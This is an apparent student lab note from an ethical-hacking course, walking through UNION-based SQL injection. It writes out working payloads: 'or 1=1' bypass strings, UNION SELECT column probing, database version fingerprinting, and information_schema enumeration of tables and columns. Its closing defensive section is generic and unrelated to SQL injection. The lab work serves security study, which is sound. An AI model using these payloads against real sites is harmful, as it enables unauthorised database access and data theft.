# 🛡️ SQL Injection - UNION LAB 1

> **Course:** [Practical Ethical Hacking](../../README.md)  
> **Module:** [Common Web Vulnerabilities](./README.md)  
> **Navigation Path:** `Practical Ethical Hacking > Common Web Vulnerabilities > SQL Injection - UNION LAB 1`

---

## 🎯 Executive Summary & Technical Objectives
This document details the practical methodology, tooling, exploitation chain, and defensive remediation for **SQL Injection - UNION LAB 1** as conducted in the TCM Security lab environment.

---

## 🔬 Hands-On Walkthrough & Technical Evidence


This will be the first lab

jeremy’ or 1=1 — -
jeremy’ or 1=1#
The “ # “ and “ — -” are used to terminate the query

The keyword union lets use retrive information from other tables and columns that were not initially defined 

When we union select when can only select the same number of columns as mentioned in the original query 

Say for eg the original query returns 3 columns but we do not knw that
jeremy’ union select null,null,null#
Can use the null to check how many columns are returned in the original query

To return specific things 
jeremy’ union select null,null,version()#
This will return the version of the database as well

If we want to knw the table names from the database
jeremy’ union select null,null,table_name from information_schema.tables#
This will return all the table names in the database

If we want to knw the coulmns names from the database
jeremy’ union select null,null,column_name from information_schema.columns#
This will return all the cloumn names in the database

Sometimes you will get an error when using null cause the first column might b integer or smtng 
we can use
null (int)
If that does not work can try just basic numbers like 1,2,3 and just play around and c if anything works





---

## 🛡️ Defensive Hardening & Detection Signatures
- **Monitoring & Auditing:** Enable granular auditing for process creation (Windows Event ID 4688 / Sysmon Event 1) and network connections (Sysmon Event 3).
- **Least Privilege:** Enforce strict principle of least privilege across user accounts and service configurations.
- **Continuous Validation:** Conduct routine vulnerability scanning and automated configuration reviews to identify drift.

---
[⬅ Back to Common Web Vulnerabilities](./README.md) • [🏠 Master Course Index](../README.md)
